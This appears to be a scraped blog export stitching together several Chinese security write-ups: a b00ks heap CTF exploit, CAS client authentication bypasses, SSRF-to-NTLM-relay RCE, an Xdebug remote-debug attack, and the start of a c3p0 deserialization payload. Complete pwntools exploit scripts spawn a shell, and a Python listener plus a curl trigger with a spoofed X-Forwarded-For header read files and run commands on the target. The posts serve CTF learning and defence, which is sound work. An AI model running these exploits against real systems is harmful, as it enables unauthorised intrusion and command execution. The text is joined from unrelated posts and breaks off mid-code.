在本地调试的时候发现，chunk地址是0x00007fdcf6db5010，0x00007fdcf6d94010。我们就用第二个来算吧，libc相对description的固定偏移是0x7fdcf6dd6000 - 0x00007fdcf6d94010 = 0x41ff0 12345678desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(\"name_mmap_addr : \" + hex(u64(name_mmap_addr)))print(\"desc_mmap_addr : \" + hex(u64(desc_mmap_addr)))libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(\"libc addr : \" + hex(libc_base)) 验证一下是对的 细说利用 (onegadget getshell)Libc base已经泄露了，下一步就是edit fake book1中指向book2的desc的地方改成free_hook地址，这样在edit book2的时候就可以覆盖free hook地址的内容为one gadget地址。然后在delete book的时候就会触发free hook的one gadget获取到shell。 123456789101112131415parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ one_gadget -f /usr/lib/x86_64-linux-gnu/libc-2.31.so0xe3afe execve(\"/bin/sh\", r15, r12)constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [r12] == NULL || r12 == NULL || r12 is a valid envp0xe3b01 execve(\"/bin/sh\", r15, rdx)constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp0xe3b04 execve(\"/bin/sh\", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL || rsi is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp 这种覆盖hook类方法的原理是在进入free之前会先看是否有自定义的free_hook函数如果有的话，就会直接用这个free hook而不会进入libc标准的free流程。 123456789101112131415161718void__libc_free (void *mem){ mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134from pwn import *bin = ELF('b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks' io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])#把author覆盖满io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(\"The first idx in bookshelf: \" + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')#伪造一个堆块，使他指向book2的堆块， book1_addr + 0x30，因为这个chunk在用所以0x30直接包含了prev_size的字段fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 0x8 ) + p64(book1_addr + 0x30 + 0x8 + 0x8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(\"name_mmap_addr : \" + hex(u64(name_mmap_addr)))print(\"desc_mmap_addr : \" + hex(u64(desc_mmap_addr)))io.recvuntil('Name: ')io.recvuntil('Description: ')libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(\"libc addr : \" + hex(libc_base))free_hook = p64(libc_base + libc.symbols[\"__free_hook\"])one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04#edit book1io.recvuntil('&gt;')io.sendline('3')# pause()io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')io.sendline(free_hook)#edit book2io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('2')io.recvuntil('Enter new book description: ')io.sendline(one_gadget)print(\"free_hook: \" + hex(libc_base + libc.symbols[\"__free_hook\"]))print(\"one gadget: \" + hex(libc_base + 0xe3afe))#delete book2io.recvuntil('&gt;')io.sendline('2')io.recvuntil('Enter the book id you want to delete:')io.sendline('2')#pause()io.interactive() 但是很不巧的是，onegadget是有约束相应寄存器的值需要是NULL，在我本机的环境里面这三个地址运行到时寄存器情况都不满足。 细说利用（system）所以这里需要换一个更通用的方法，预先再创建一个book3把description字段和name字段覆盖成/bin/bash\\x00，接着把freehook的地址替换成system。这样在delete时候原本free chunk会直接变成system(‘/bin/bash\\x00’)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from pwn import *bin = ELF('b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks'io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(\"The first idx in bookshelf: \" + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 4 + 4 ) + p64(book1_addr + 0x30 + 4 + 4 + 8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#add book3io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('32')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('/bin/bash\\x00')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('/bin/bash\\x00')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(\"name_mmap_addr : \" + hex(u64(name_mmap_addr)))print(\"desc_mmap_addr : \" + hex(u64(desc_mmap_addr)))io.recvuntil('Name: ')io.recvuntil('Description: ')io.recvuntil('Name: ')io.recvuntil('Description: ')libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(\"libc addr : \" + hex(libc_base))free_hook = p64(libc_base + libc.symbols[\"__free_hook\"])# one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04system = p64(libc_base + libc.symbols[\"system\"])#edit book1io.recvuntil('&gt;')io.sendline('3')# pause()io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')io.sendline(free_hook)#edit book2io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('2')io.recvuntil('Enter new book description: ')io.sendline(system)print(\"free_hook: \" + hex(libc_base + libc.symbols[\"__free_hook\"]))# print(\"one gadget: \" + hex(libc_base + 0xe3afe))print(\"system : \" + hex(libc_base + libc.symbols[\"system\"]))#delete book3io.recvuntil('&gt;')io.sendline('2')io.recvuntil('Enter the book id you want to delete:')io.sendline('3')# pause()io.interactive() 附 request2size123456789101112# 常量定义 SIZE_SZ = 8 # 64位系统上 size_t 的大小 MALLOC_ALIGN_MASK = 15 # 16字节对齐掩码 (0xF) MINSIZE = 32 # 假设的最小块大小 def request2size(req): if req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE: return MINSIZE else: return (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK print(hex(request2size(32))) 附 brk起始地址计算方式1234567891011121314151617181920212223242526272829303132333435363738394041424344mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);unsigned long arch_randomize_brk(struct mm_struct *mm){ unsigned long range_end = mm-&gt;brk + 0x02000000; return randomize_range(mm-&gt;brk, range_end, 0) ? : mm-&gt;brk;}unsigned longrandomize_range(unsigned long start, unsigned long end, unsigned long len){ unsigned long range = end - len - start; if (end &lt;= start + len) return 0; return PAGE_ALIGN(get_random_int() % range + start);// #define PAGE_ALIGN(addr) ALIGN(addr, PAGE_SIZE)}/* * Get a random word for internal kernel use only. Similar to urandom but * with the goal of minimal entropy pool depletion. As a result, the random * value is not cryptographically secure but for several uses the cost of * depleting entropy is too high */static DEFINE_PER_CPU(__u32 [MD5_DIGEST_WORDS], get_random_int_hash);unsigned int get_random_int(void){ __u32 *hash; unsigned int ret; if (arch_get_random_int(&amp;ret)) return ret; hash = get_cpu_var(get_random_int_hash); hash[0] += current-&gt;pid + jiffies + random_get_entropy(); //random_get_entropy This function returns the processor cycle counter value if available, else it returns zero. md5_transform(hash, random_int_secret); ret = hash[0]; put_cpu_var(get_random_int_hash); return ret;}EXPORT_SYMBOL(get_random_int); 附 mmap计算方式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182void arch_pick_mmap_layout(struct mm_struct *mm, struct rlimit *rlim_stack){ if (mmap_is_legacy()) clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); else set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base, arch_rnd(mmap64_rnd_bits), task_size_64bit(0), rlim_stack);}/* * This function, called very early during the creation of a new * process VM image, sets up which VM layout function to use: */static void arch_pick_mmap_base(unsigned long *base, unsigned long *legacy_base, unsigned long random_factor, unsigned long task_size, struct rlimit *rlim_stack){ *legacy_base = mmap_legacy_base(random_factor, task_size); if (mmap_is_legacy()) *base = *legacy_base; else *base = mmap_base(random_factor, task_size, rlim_stack);}unsigned long task_size_64bit(int full_addr_space){ return full_addr_space ? TASK_SIZE_MAX : DEFAULT_MAP_WINDOW;}static __always_inline unsigned long task_size_max(void){ unsigned long ret; alternative_io(\"movq %[small],%0\",\"movq %[large],%0\", X86_FEATURE_LA57, \"=r\" (ret), [small] \"i\" ((1ul &lt;&lt; 47)-PAGE_SIZE), [large] \"i\" ((1ul &lt;&lt; 56)-PAGE_SIZE)); return ret;}unsigned long arch_mmap_rnd(void){ return arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);}static unsigned long arch_rnd(unsigned int rndbits){ if (!(current-&gt;flags &amp; PF_RANDOMIZE)) return 0; return (get_random_long() &amp; ((1UL &lt;&lt; rndbits) - 1)) &lt;&lt; PAGE_SHIFT;}static unsigned long mmap_base(unsigned long rnd, unsigned long task_size, struct rlimit *rlim_stack){ unsigned long gap = rlim_stack-&gt;rlim_cur; unsigned long pad = stack_maxrandom_size(task_size) + stack_guard_gap; unsigned long gap_min, gap_max; /* Values close to RLIM_INFINITY can overflow. */ if (gap + pad &gt; gap) gap += pad; /* * Top of mmap area (just below the process stack). * Leave an at least ~128 MB hole with possible stack randomization. */ gap_min = SIZE_128M; gap_max = (task_size / 6) * 5; if (gap &lt; gap_min) gap = gap_min; else if (gap &gt; gap_max) gap = gap_max; return PAGE_ALIGN(task_size - gap - rnd);} 附 固定地址原理因为，我当时是英文论坛和网友交流得出的结论，我这里直接贴我当时回复了。 I think brk and mmap are two different things in linux. When I malloc small space of linux, malloc will use brk. Inversely, it will use mmap for big space (almost &gt; 128KB). In ASLR, both heap and mmap will have a random offset. brk 12345unsigned long arch_randomize_brk(struct mm_struct *mm){ unsigned long range_end = mm-&gt;brk + 0x02000000; return randomize_range(mm-&gt;brk, range_end, 0) ? : mm-&gt;brk;} mmap 12345678910111213141516171819202122void arch_pick_mmap_layout(struct mm_struct *mm, struct rlimit *rlim_stack){ if (mmap_is_legacy()) clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); else set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base, arch_rnd(mmap64_rnd_bits), task_size_64bit(0), rlim_stack);}static void arch_pick_mmap_base(unsigned long *base, unsigned long *legacy_base, unsigned long random_factor, unsigned long task_size, struct rlimit *rlim_stack){ *legacy_base = mmap_legacy_base(random_factor, task_size); if (mmap_is_legacy()) *base = *legacy_base; else *base = mmap_base(random_factor, task_size, rlim_stack);} PS: If paging is level 4, task size is 0x7ffffffff000. For example, here my heap is from 0x55650f802000 and mmap area is from 0x7fdcf6d94000. 12345678910111213141516171819202122232425process 1181521Mapped address spaces: Start Addr End Addr Size Offset objfile 0x55650f600000 0x55650f602000 0x2000 0x0 /home/parallels/Desktop/b00ks 0x55650f801000 0x55650f802000 0x1000 0x1000 /home/parallels/Desktop/b00ks 0x55650f802000 0x55650f803000 0x1000 0x2000 /home/parallels/Desktop/b00ks 0x556510fde000 0x556510fff000 0x21000 0x0 [heap] 0x7fdcf6d94000 0x7fdcf6dd6000 0x42000 0x0 0x7fdcf6dd6000 0x7fdcf6df8000 0x22000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6df8000 0x7fdcf6f70000 0x178000 0x22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6f70000 0x7fdcf6fbe000 0x4e000 0x19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fbe000 0x7fdcf6fc2000 0x4000 0x1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fc2000 0x7fdcf6fc4000 0x2000 0x1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fc4000 0x7fdcf6fca000 0x6000 0x0 0x7fdcf6fdd000 0x7fdcf6fde000 0x1000 0x0 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf6fde000 0x7fdcf7001000 0x23000 0x1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf7001000 0x7fdcf7009000 0x8000 0x24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700a000 0x7fdcf700b000 0x1000 0x2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700b000 0x7fdcf700c000 0x1000 0x2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700c000 0x7fdcf700d000 0x1000 0x0 0x7ffe19d76000 0x7ffe19d97000 0x21000 0x0 [stack] 0x7ffe19df2000 0x7ffe19df6000 0x4000 0x0 [vvar] 0x7ffe19df6000 0x7ffe19df8000 0x2000 0x0 [vdso] 0xffffffffff600000 0xffffffffff601000 0x1000 0x0 [vsyscall] Besides, the dynamic loader uses mmap(2) with MAP_PRIVATE and appropriate permissions. https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes So, my understanding is: If the program is simple, like I can fully predict what will happen e.g. when malloc will be, size of per chunk of mmap, if the program will load .so or uninstall .so, no side effect of random of time, etc. Once the address of chunk in mmap is leaked, I can calc libc base, because as you said： Both of them are relative in memory (allocated by mmap). The beginning address of mapping is random, but the rest mapping is not random. Finally, I just need to run the program locally to the same leak address following the same steps, and then calculate the fixed offset at that point. This offset will always be valid, even with ASLR. 参考 https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/ https://blog.csdn.net/qq_48466156/article/details/139691096 https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit http://www.asuka39.top/article/security/ctf/pwn/2582/","link":"/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"},{"title":"Two Tricks Of CAS-CLIENT AUTH Bypass","text":"首发于先知社区 cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。 bypass trick1 ignorePattern场景/api/admin这个url是需要cas登陆才能访问的。 1234567891011121314package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController { @RequestMapping(\"/api/admin\") public String admin(){ return \"hello admin\"; }} /api/guest这个是公共页面，所有人都可以看。 1234567891011121314package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class GuestController { @RequestMapping(\"/api/guest\") public String guest(){ return \"hello guest\"; } } 假设此程序的技术比较老旧，为了实现上面这种需求，那么开发可能会在web.xml中这么配置。 1234567891011121314151617181920&lt;filter&gt; &lt;filter-name&gt;CAS Authentication Filter&lt;/filter-name&gt; &lt;filter-class&gt;org.jasig.cas.client.authentication.AuthenticationFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;casServerUrlPrefix&lt;/param-name&gt; &lt;param-value&gt;https://battags.ad.ess.rutgers.edu:8443/cas&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;serverName&lt;/param-name&gt; &lt;param-value&gt;http://www.acme-client.com&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;ignorePattern&lt;/param-name&gt; &lt;param-value&gt;/api/guest&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;CAS Authentication Filter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 这样配置看起来似乎没有问题 利用但是其实可以被花式绕过。 原理原因有两点，第一org.jasig.cas.client.authentication.AuthenticationFilter，在匹配时候获取了原生url（未处理../），甚至包括? 后的内容。 第二，filter的匹配模式有四种，默认是按正则匹配。 同理如果配置成CONTAINS也会有类似的问题。 同理封装了这个库的三方库也会有问题，比较流行的是cas-client-autoconfig-support ，它常与springboot集成使用，如果有如下配置也会出问题。 1cas.ignorePattern=/api/guest 修复所以正确的配置应该改为 1234&lt;init-param&gt; &lt;param-name&gt;ignorePattern&lt;/param-name&gt; &lt;param-value&gt;^/api/guest$&lt;/param-value&gt;&lt;/init-param&gt; 个人认为这个可以算洞（没处理../而且contains这种选项就不应该存在），也可以甩锅给开发没仔细看文档。 bypass trick2 useSuffixPatternMatch场景这里假设/admin系列的路由都不允许访问。 1234567891011121314151617181920212223242526package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController { @RequestMapping( value = {\"/admin\"}, method = {RequestMethod.GET} ) public String admin(){ return \"hello admin\"; } @RequestMapping( value = {\"/admin/api\"}, method = {RequestMethod.GET} ) public String admin1(){ return \"hello admin1\"; }} 这一次开发认真看了文档做了以下配置。 1234567891011121314151617181920212223242526package today.redteam.config;import net.unicon.cas.client.configuration.CasClientConfigurerAdapter;import net.unicon.cas.client.configuration.EnableCasClient;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Configuration;import today.redteam.aop.CasAspect;@Configuration@EnableCasClientpublic class CasConfig extends CasClientConfigurerAdapter { public CasConfig() { } public void configureAuthenticationFilter(FilterRegistrationBean authenticationFilter) { super.configureAuthenticationFilter(authenticationFilter); authenticationFilter.addUrlPatterns(new String[]{\"/admin/*\"}); } static { System.setProperty(\"cas.serverUrlPrefix\", \"https://cashost.com/cas\"); System.setProperty(\"cas.serverLoginUrl\", \"https://cashost.com/cas/login\"); System.setProperty(\"cas.clientHostUrl\", \"http://localhost:8888/\"); System.setProperty(\"cas.validationType\", \"CAS\"); }} /admin这个路由看起来似乎也没有什么问题。 常规的绕过方式也不起作用 利用但在低版本的springboot上还是能绕过（本地环境是1.5.9.RELEASE）。 原理原理是在springboot 1.x中useSuffixPatternMatch默认为true，springboot会对路由进行正则匹配。 断点下在org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPattern。 /admin.*自然能匹配上/admin.也就绕过了。 修复如下关闭setUseSuffixPatternMatch或升级到2.x 12345678910111213141516171819202122package today.redteam.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerMapping;import org.springframework.web.servlet.config.annotation.EnableWebMvc;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;@Configuration@ComponentScan@EnableWebMvcpublic class AppConfig { @Bean public HandlerMapping requestMappingHandlerMapping() { RequestMappingHandlerMapping mapping = new RequestMappingHandlerMapping(); mapping.setUseSuffixPatternMatch(false); return mapping; }}","link":"/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/"},{"title":"Using Java&#39;s SSRF vulnerability rce via ntlm relay","text":"环境搭建实验室环境说明• 6.1.7601 Service Pack 1 Build 7601• jdk1.7.0_80• 工作组环境 实验代码 12345678910111213141516171819202122232425&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;%@ page import=\"java.io.BufferedReader\" %&gt;&lt;%@ page import=\"java.io.IOException\" %&gt;&lt;%@ page import=\"java.io.InputStreamReader\" %&gt;&lt;%@ page import=\"java.net.URL\" %&gt;&lt;%@ page import=\"java.net.URLConnection\" %&gt;&lt;% String ssrf = request.getParameter(\"ssrf\"); URL url = new URL(ssrf); URLConnection connection = url.openConnection(); connection.setRequestProperty(\"user-agent\", \"javasec\"); connection.setConnectTimeout(1000); connection.setReadTimeout(1000); connection.connect(); connection.getHeaderFields(); connection.getInputStream(); StringBuilder resp = new StringBuilder(); BufferedReader in = new BufferedReader( new InputStreamReader(connection.getInputStream())); String line; while ((line = in.readLine()) != null) { resp.append(\"/n\").append(line); } System.out.print(resp.toString());%&gt; 漏洞复现使用ultrarelay监听端口，访问url http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1触发ssrf漏洞时可以看到已经把受害机的ntlm hash拿到了。 原理分析本质上就是一次从http到smb跨协议ntlm relay本机，但是我们知道在 MS16-075之后微软修复了http-&gt;smb的本机relay。所以为了绕过这个限制需要将type2(NTLMSSP_CHALLENGE)Negotiate Flags中的0x00004000设置为0，但是设置为0后会出现另外一个问题那就是MIC验证会不通过，为了绕过这个限制又需要把type2 Negotiate Flags中的Negotiate Always Sign设置为0。 响应victim401并开启ntlm认证 victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victim，重点就在这步在给victim的http应答中将0x00004000和Negotiate Always Sign都设置为了0。 victim-&gt; http NTLMSSP_AUTH -&gt;hacker hacker-&gt; smb NTLMSSP_AUTH -&gt;victim 后面认证成功后，响应victim 404，并连接victim的IPC$进行后续rce操作。 成功条件• http-&gt;smb未打新补丁• 工作条件环境下需要administrator（sid 500）• 一个ssrf或者xxe的点 参考Ntlm Relay is dead, Long Live Ntlm RelayNtlm-Relay-Reloaded-Attack-methods-you-do-not-knowntlmrelay","link":"/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/"},{"title":"Xdebug原理学习及其攻击面复现","text":"通信过程Xdebug的工作原理可以总结为下面几个步骤 IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议 浏览器向Httpd服务器发送一个带有XDEBUG_SESSION_START参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理 Php（有Xdebug的拓展）看到这个请求是带了XDEBUG_SESSION_START 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。 Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。 Xdebug开始过滤代码，Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策。 相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。 实际过程中的抓包如图 当链接建立成功的时候php端会[PSH，ACK] 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;init xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" fileuri=\"file:///var/www/html/test1.php\" language=\"PHP\" xdebug:language_version=\"7.0.22-2\" protocol_version=\"1.0\" appid=\"2000\" idekey=\"phpstorm\"&gt; &lt;engine version=\"2.5.5\"&gt; &lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt; &lt;author&gt; &lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt; &lt;url&gt; &lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt; &lt;copyright&gt; &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt; 需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中，调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)。 漏洞复现攻击思路来自初心を忘れず 这里将文中提到的姿势进行复现,偷一波脚本 1234567891011121314151617181920#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True: client_data = conn.recv(1024) print(client_data) data = raw_input('&gt;&gt; ') #读文件 conn.sendall('source -i 1 -f %s\\x00' % data) #执行命令 #conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64')) #执行命令2 #conn.sendall('property_set -n $a -i 1 -c 1 -- %s\\x00' % data.encode('base64')) 触发漏洞 1curl 'http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm' -H \"X-Forwarded-For: 192.168.169.36\" sourcefile:///etc/passwd evalsystem(“id”); property_setsystem(“id”); 退出后可以看到 尝试写shell失败（test是777），忽然想到可以base64。 最后利用条件是要xdebug.remote_connect_back开启 在文档是这样描述的：xdebug.remote_connect_back类型: boolean, 默认值: 0, 始于 Xdebug &gt; 2.1 如果设置生效， xdebug.remote_host 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 xdebug.remote_host. 参考Xdebug工作原理","link":"/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/"},{"title":"c3p0的三个gadget","text":"c3p0有三种方式getshell http base jndi hex序列化字节加载器 http base适用于原生反序列化，后面两种适用于其他解组类型的反序列化。具体来讲，jndi适用于jdk8u191以下支持reference情况，hex序列化字节加载器适用于不出网但是目标依赖有gadget链的情况。 http basec3p0 payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package ysoserial.payloads;import java.io.PrintWriter;import java.sql.SQLException;import java.sql.SQLFeatureNotSupportedException;import java.util.logging.Logger;import javax.naming.NamingException;import javax.naming.Reference;import javax.naming.Referenceable;import javax.sql.ConnectionPoolDataSource;import javax.sql.PooledConnection;import com.mchange.v2.c3p0.PoolBackedDataSource;import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;/** * * * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject * 